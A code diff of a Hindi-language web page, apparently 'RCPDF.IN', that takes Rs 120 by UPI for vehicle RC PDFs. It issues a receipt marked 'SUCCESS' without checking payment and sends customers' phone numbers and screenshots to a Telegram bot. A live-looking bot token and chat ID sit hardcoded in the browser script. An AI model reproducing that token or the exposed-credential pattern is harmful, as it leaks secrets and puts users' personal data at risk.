@@ -43,7 +43,7 @@
 
         .btn { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--primary); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 0 #b30047; margin-top: 10px; }
 
-        /* RGB NEON BUTTON */
+        /* RGB NEON BUTTON - FAST MOVE */
         .neon-btn {
             position: relative; background: #000; color: #fff; font-size: 22px; font-weight: 900;
             padding: 20px; width: 100%; border-radius: 15px; border: none; cursor: pointer;
@@ -116,9 +116,6 @@
     </div>
 
     <script>
-        const T_TOKEN = "8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
-        const T_CHAT_ID = "5600045707";
-
         function toggleM() { document.getElementById('side').classList.toggle('active'); }
 
         function formatV(i) {
@@ -132,7 +129,7 @@
         }
 
         function go2() {
-            if(document.getElementById('vehInput').value.length < 9) { alert("कृपया गाड़ी का सही नंबर डालें!"); return; }
+            if(document.getElementById('vehInput').value.length < 9) { alert("कृपया गाड़ी का सही नंबर डालें!"); return; }
             const upi = "upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD";
             document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(upi);
             document.getElementById('p1').style.display='none';
@@ -141,49 +138,24 @@
 
         function pay() { window.location.href="upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC%20DOWNLOAD"; }
 
-        async function sendToTelegram(file) {
-            let v_no = document.getElementById('vehInput').value;
-            let m_no = document.getElementById('mob').value;
-            let fd = new FormData();
-            fd.append("chat_id", T_CHAT_ID);
-            fd.append("photo", file);
-            fd.append("caption", `🚀 *NEW RC ORDER*\n\n🚗 *Veh:* ${v_no}\n📱 *Mob:* ${m_no}\n💰 *Amt:* ₹120\n✅ *Status:* Paid`);
-            fd.append("parse_mode", "Markdown");
-
-            try {
-                let response = await fetch(`https://api.telegram.org/bot${T_TOKEN}/sendPhoto`, {
-                    method: "POST",
-                    body: fd
-                });
-                let result = await response.json();
-                if(!result.ok) {
-                    alert("Telegram Error: " + result.description);
-                }
-            } catch (err) {
-                console.error("Network error:", err);
-            }
-        }
-
         function submit() {
             const m = document.getElementById('mob').value;
             const s = document.getElementById('ss').files[0];
-            if(m.length < 10) { alert("कृपया 10 अंकों का WhatsApp नंबर डालें!"); return; }
-            if(!s) { alert("कृपया पेमेंट स्क्रीनशॉट अपलोड करें!"); return; }
+            
+            // Blank check validation
+            if(m.length < 10) { alert("कृपया अपना 10 अंकों का WhatsApp नंबर डालें!"); return; }
+            if(!s) { alert("कृपया पेमेंट का स्क्रीनशॉट अपलोड करें!"); return; }
 
             document.getElementById('load').style.display='flex';
             let p = 0;
-            let iv = setInterval(async () => {
+            let iv = setInterval(() => {
                 p += 2;
                 document.getElementById('pText').innerText = p + "%";
                 document.getElementById('carIcon').style.left = (p * 0.88) + "%";
                 if(p >= 100) {
                     clearInterval(iv);
-                    // PDF Pehle
                     makePDF();
-                    // Telegram Phir
-                    await sendToTelegram(s);
-                    // Reload last mein
-                    setTimeout(() => { location.reload(); }, 2000);
+                    sendT(s);
                 }
             }, 60);
         }
@@ -193,13 +165,36 @@
             const doc = new jsPDF();
             const v = document.getElementById('vehInput').value;
             const m = document.getElementById('mob').value;
+
+            // Simple Box Layout PDF (10:36 PM version)
             doc.setDrawColor(0); doc.rect(5, 5, 200, 287);
             doc.setFillColor(0, 51, 153); doc.rect(5, 5, 200, 30, 'F');
-            doc.setTextColor(255); doc.setFontSize(24); doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 25, null, null, "center");
-            doc.setTextColor(0); doc.setFontSize(12); doc.text(`Vehicle Number: ${v}`, 20, 60);
-            doc.text(`WhatsApp No: ${m}`, 20, 70);
-            doc.text(`Amount Paid: INR 120.00`, 20, 80);
+            doc.setTextColor(255); doc.setFontSize(22); doc.text("RCPDF.IN - RECEIPT", 105, 25, null, null, "center");
+            
+            doc.setTextColor(0); doc.setFontSize(14);
+            doc.text(`VEHICLE NO: ${v}`, 20, 50);
+            doc.text(`WHATSAPP NO: ${m}`, 20, 60);
+            doc.text(`PAID AMOUNT: Rs.120.00`, 20, 70);
+            doc.text(`STATUS: SUCCESS`, 20, 80);
+            
+            doc.setFontSize(10); doc.text("1. Original RC PDF will be sent on WhatsApp in 30-60 mins.", 20, 110);
+            doc.text("2. Payment is non-refundable.", 20, 116);
             doc.save(`Receipt_${v}.pdf`);
+            location.reload();
+        }
+
+        function sendT(f) {
+            let fd = new FormData();
+            fd.append("chat_id", "5600045707");
+            fd.append("photo", f);
+            let msg = `🚀 NEW RC ORDER\n🚗 Veh: ${document.getElementById('vehInput').value}\n📱 Mob: ${document.getElementById('mob').value}`;
+            fd.append("caption", msg);
+            
+            // 10:36 PM wala working fetch call
+            fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto", {
+                method: "POST", 
+                body: fd
+            });
         }
     </script>
 </body>
